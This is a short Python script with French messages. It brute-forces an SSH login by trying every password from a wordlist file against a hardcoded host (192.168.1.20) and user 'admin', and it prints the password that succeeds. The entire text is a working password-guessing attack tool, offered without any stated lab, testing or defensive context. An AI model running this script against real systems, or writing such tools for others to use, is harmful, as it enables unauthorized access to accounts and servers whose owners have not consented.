import paramiko

def ssh_brute_force(target_ip, nom_util, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            ssh.connect(target_ip, username=nom_util, password=password)
            print(f"Succès : Mot de passe trouvé --> {password}")
            return
        except paramiko.AuthenticationException:
            print(f"Échec : {password}")
        except Exception as e:
            print(f"Erreur lors de la connexion : {e}")
            return

    print("aucun mdp")

target_ip = "192.168.1.20" 
username = "admin" 

def load_password_list(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

password_list = load_password_list('wordlist.txt') 
ssh_brute_force(target_ip, username, password_list)
